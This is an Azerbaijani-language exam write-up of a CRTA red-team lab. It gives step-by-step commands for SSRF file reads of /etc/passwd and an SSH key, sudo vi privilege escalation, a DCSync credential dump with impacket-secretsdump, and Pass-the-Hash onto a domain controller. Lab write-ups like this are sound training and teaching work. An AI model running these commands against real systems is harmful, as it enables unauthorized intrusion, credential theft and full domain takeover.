# CRTA İmtahanı — Tam Writeup

**Sertifikat:** CyberWarFare Labs — CRTA (Certified Red Team Analyst)  
**Status:** ✅ PASSED  
**Mühit:** Black-box, VPN-bağlı canlı şəbəkə  
**Hədəf:** Domain Controller-dən `secret.xml` faylını əldə etmək  

---

## MÜNDƏRİCAT

1. [İmtahan Haqqında](#1-imtahan-haqqında)
2. [Şəbəkə Mühiti](#2-şəbəkə-mühiti)
3. [Mərhələ 1 — Kəşfiyyat](#3-mərhələ-1--kəşfiyyat)
4. [Mərhələ 2 — Veb Tətbiq Analizi (SSRF)](#4-mərhələ-2--veb-tətbiq-analizi-ssrf)
5. [Mərhələ 3 — İlkin Giriş (SSH)](#5-mərhələ-3--ilkin-giriş-ssh)
6. [Mərhələ 4 — Privilege Escalation](#6-mərhələ-4--privilege-escalation)
7. [Mərhələ 5 — Docker Konteyner Analizi](#7-mərhələ-5--docker-konteyner-analizi)
8. [Mərhələ 6 — Lateral Movement + Pivot](#8-mərhələ-6--lateral-movement--pivot)
9. [Mərhələ 7 — DCSync Hücumu](#9-mərhələ-7--dcsync-hücumu)
10. [Mərhələ 8 — Pass-the-Hash → Domain Admin](#10-mərhələ-8--pass-the-hash--domain-admin)
11. [Hücum Zənciri](#11-hücum-zənciri)
12. [Öyrənimlər](#12-öyrənimlər)
13. [İstifadə Edilən Alətlər](#13-istifadə-edilən-alətlər)

---

## 1. İMTAHAN HAQQINDA

CRTA (Certified Red Team Analyst) — CyberWarFare Labs tərəfindən təqdim edilən tam praktiki, black-box red team imtahanıdır. Test çox seçimli sualları yoxdur — ya maşına daxil olub flag toplayırsınız, ya da keçmirsiniz.

**İmtahanın hədəfi:**  
Çox qatlı infrastrukturu kompromis et, imtiyazları artır, lateral movement icra et və nəhayət Domain Controller-in Administrator masaüstündən `secret.xml` faylını əldə et.

> **Disclaimer:** Bu writeup imtahan keçildikdən sonra dərc edilmişdir. CWL metodologiyanın paylaşılmasına açıq şəkildə icazə verir. Heç bir credentials və ya tam flag burada açıqlanmır.

---

## 2. ŞƏBƏKƏ MÜHİTİ

| Komponent | Dəyər |
|---|---|
| VPN Scope | 172.26.10.0/24 |
| Scope xaricindəki | 172.26.10.1 (gateway — toxunulmaz) |
| İlkin hədəf | 172.26.10.11 |
| Daxili şəbəkə | 10.10.10.0/24 (sonradan kəşf edildi) |
| Domain Controller | 10.10.10.100 |

---

## 3. MƏRHƏLƏ 1 — KƏŞFİYYAT

### 3.1 Canlı Hostların Tapılması

```bash
nmap -sn 172.26.10.0/24
```

**Nəticə:** Yalnız bir canlı host tapıldı: `172.26.10.11`

### 3.2 Tam Port Skanı

```bash
nmap -sV -sC -p- 172.26.10.11 --min-rate 5000 -oN nmap_full.txt
```

**Açıq portlar:**

| Port | Servis | Qeyd |
|---|---|---|
| 22/tcp | SSH | OpenSSH |
| 8091/tcp | HTTP | HotHost monitoring xidməti |
| 23100/tcp | HTTP | Python Flask tətbiqi |

---

## 4. MƏRHƏLƏ 2 — VEB TƏTBİQ ANALİZİ (SSRF)

### 4.1 Flask Tətbiqi (Port 23100)

`172.26.10.11:23100` ünvanında Flask tətbiqi çalışırdı. Routeları araşdırdıqda kritik bir endpoint tapıldı:

```
/fetch?url=
```

Bu endpoint URL parametrini qəbul edib həmin URL-in məzmununu geri qaytarırdı — klassik **SSRF (Server-Side Request Forgery)** ssenariisi.

### 4.2 SSRF Zəifliyinin Sınaqdan Keçirilməsi

```bash
curl "http://172.26.10.11:23100/fetch?url=http://127.0.0.1/"
```

Uğurla cavab döndü — server öz daxili interfeysindən sorğu etdi.

### 4.3 SSRF → Lokal Fayl Oxuma (file:// sxemi)

`file://` URI sxemi test edildi:

```bash
curl "http://172.26.10.11:23100/fetch?url=file:///hostfs/etc/passwd"
```

> **Vacib qeyd:** `/hostfs/` prefiksi Docker konteynerindən çıxıb əsas host maşınının fayl sisteminə çatmağa imkan verdi.

**Nəticə:** `/etc/passwd` döndü. Kritik istifadəçi aşkarlandı:

```
app-admin:x:1001:1001::/home/app-admin:/bin/bash
```

### 4.4 SSH Private Key-in Oxunması

```bash
curl "http://172.26.10.11:23100/fetch?url=file:///hostfs/home/app-admin/.ssh/id_rsa"
```

### 4.5 Konfiqurasiya Faylından Parol

```bash
curl "http://172.26.10.11:23100/fetch?url=file:///hostfs/etc/app-config"
```

**Nəticə:** Açıq mətnlə parol tapıldı:

```
app-admin : @dmin@123
```

---

## 5. MƏRHƏLƏ 3 — İLKİN GİRİŞ (SSH)

SSRF vasitəsilə əldə edilən credentials ilə SSH girişi:

```bash
ssh app-admin@172.26.10.11
```

✅ **Shell əldə edildi.**

---

## 6. MƏRHƏLƏ 4 — PRİVİLEGE ESCALATION

### 6.1 Sudo Hüquqlarının Yoxlanması

```bash
sudo -l
```

**Nəticə:**

```
User app-admin may run the following commands on this host:
    (ALL : ALL) NOPASSWD: /usr/bin/vi
```

`vi` koması `NOPASSWD` ilə çalışdırıla bilir — klassik **GTFOBins** ssenariisi.

### 6.2 vi ilə Root Shell

```bash
sudo /usr/bin/vi -c ':!/bin/bash'
```

✅ **Root shell əldə edildi — 172.26.10.11**

---

## 7. MƏRHƏLƏ 5 — DOCKER KONTEYNER ANALİZİ

### 7.1 Çalışan Konteynerlərin Siyahısı

```bash
docker ps
```

**Nəticə:** İki konteyner çalışırdı:
- HotHost monitoring xidməti (port 8091)
- Flask SSRF tətbiqi (port 23100)

### 7.2 HotHost Konteynerinə Daxil Olma

```bash
docker exec -it <container_id> /bin/bash
cat /hothost.json
```

**hothost.json məzmunu:** MD5 hash tapıldı:

```
665a26fad71ea9ef3edf5f33195d4b31
```

### 7.3 Flag Formatının Hesablanması

İmtahan binary MD5 hash-in Base64 kodlamasını tələb edirdi:

```bash
echo "665a26fad71ea9ef3edf5f33195d4b31" | xxd -r -p | base64
```

**Nəticə (Flag):**
```
Zlom+tceqe8+318zGV1LMQ==
```

> **Vacib:** İmtahan hex string-in Base64-ünü deyil, binary reprezentasiyanın Base64-ünü soruşur. Bu fərqi bilmək kritikdir.

---

## 8. MƏRHƏLƏ 6 — LATERAL MOVEMENT + PİVOT

### 8.1 Daxili Şəbəkənin Kəşfi

Auth loglarında daxili IP ünvanları axtarıldı:

```bash
cat /var/log/auth.log | grep "Accepted"
```

**Nəticə:** Davamlı olaraq `10.10.10.20` IP-si görünürdü — daxili şəbəkənin varlığı aşkarlandı.

### 8.2 10.10.10.20-nin Skanlanması

```bash
nmap -sV -p- 10.10.10.20 --min-rate 3000
```

### 8.3 Veb Məzmun Siyahılaması

```bash
gobuster dir -u http://10.10.10.20 \
             -w /usr/share/wordlists/dirb/common.txt
```

**Tapılan:** `/elfinder` qovluğu — fayl meneceri interfeysi

### 8.4 AD Credentials-ın Tapılması

`/elfinder` interfeysindən `AD_Resources.txt` faylı əldə edildi:

```
sync_user@ent.corp / Summer@2025
```

---

## 9. MƏRHƏLƏ 7 — DCSYNC HÜCUMU

`sync_user` hesabı Domain Controller-ə qarşı **DCSync** hücumu üçün lazımi imtiyazlara malik idi. Impacket-in `secretsdump` modulu istifadə edildi:

```bash
impacket-secretsdump ent.corp/sync_user:'Summer@2025'@10.10.10.100
```

**Tapılan kritik hash-lər:**

```
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<NT_HASH>:::
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<NT_HASH>:::
```

> `krbtgt` NT hash-i imtahanda ayrıca flag kimi tələb edilir.

---

## 10. MƏRHƏLƏ 8 — PASS-THE-HASH → DOMAIN ADMIN

### 10.1 SMB ilə Domain Controller-ə Qoşulma

Administrator NT hash-i ilə **Pass-the-Hash** hücumu:

```bash
smbclient //10.10.10.100/C$ -U 'Administrator' --pw-nt-hash
```

### 10.2 secret.xml Faylının Tapılması

```bash
smb: \> cd Users\Administrator\Desktop
smb: \Users\Administrator\Desktop\> get secret.xml.txt
```

✅ **`secret.xml.txt` əldə edildi — İmtahan hədəfi tamamlandı!**

---

## 11. HÜCUM ZƏNCİRİ

```
[VPN] 172.26.10.0/24
        │
        └── nmap -sn → 172.26.10.11 (yeganə canlı host)
                │
                ├── Port 23100 — Flask /fetch endpoint
                │       │
                │       └── SSRF (file:// sxemi)
                │               ├── /hostfs/etc/passwd → app-admin
                │               └── /hostfs/etc/app-config → app-admin:@dmin@123
                │
                └── SSH → app-admin@172.26.10.11
                        │
                        └── sudo -l → vi (NOPASSWD)
                                │
                                └── sudo vi → GTFOBins → ROOT
                                        │
                                        └── docker ps → HotHost konteyner
                                                │
                                                └── hothost.json → MD5 hash → Base64 Flag
                                                │
                                                └── /var/log/auth.log → 10.10.10.20 kəşf edildi
                                                        │
                                                        ├── gobuster → /elfinder
                                                        │       └── AD_Resources.txt
                                                        │               └── sync_user:Summer@2025
                                                        │
                                                        └── impacket-secretsdump → DC (10.10.10.100)
                                                                ├── krbtgt NT hash (Flag)
                                                                └── Administrator NT hash
                                                                        │
                                                                        └── smbclient PtH → DC
                                                                                └── secret.xml.txt ✅
```

---

## 12. ÖYRƏNIMLƏR

### 1. SSRF yalnız HTTP deyil
`file://` sxemi test edilməlidir. Docker mühitlərində `/hostfs/` prefiksi ilə host maşınının fayl sisteminə çatmaq mümkün ola bilər.

### 2. sudo -l hər shell-dən sonra ilk əmr olmalıdır
Shell əldə etdikdən dərhal sonra `sudo -l` əmri icra edilməlidir. GTFOBins-i əzbərləyin.

### 3. Log faylları qızıl mədənidir
`/var/log/auth.log` faylı daxili şəbəkənin varlığını ortaya çıxardı. Gizli IP ünvanları log fayllarında tez-tez qalır.

### 4. Hash formatı vacibdir
İmtahan Binary MD5-in Base64-ünü tələb etdi — hex string-in Base64-ünü deyil. Kodlama formatını həmişə doğrulayın.

### 5. DCSync imtiyazlarını yoxlayın
AD credentials tapıldıqda dərhal onların DCSync üçün kifayət edib-etmədiyini yoxlayın. `sync` adlı hesablar çox vaxt replikasiya imtiyazlarına malikdir.

---

## 13. İSTİFADƏ EDİLƏN ALƏTLƏR

| Alət | Məqsəd |
|---|---|
| **nmap** | Port skanı, servis aşkarlanması |
| **curl** | SSRF zəifliyinin istismarı, fayl oxunması |
| **ssh** | İlkin giriş |
| **sudo / vi** | Privilege escalation (GTFOBins) |
| **docker** | Konteyner analizi |
| **gobuster** | Veb məzmun siyahılaması |
| **impacket-secretsdump** | DCSync hücumu, hash dump |
| **smbclient** | Pass-the-Hash, fayl əldə etmə |

---

*CRTA — CyberWarFare Labs Certified Red Team Analyst*  
*Status: ✅ PASSED*  
*Tarix: 2026*  
*Hazırladı: Ramin Abdullayev | raminabdullayev048@gmail.com*
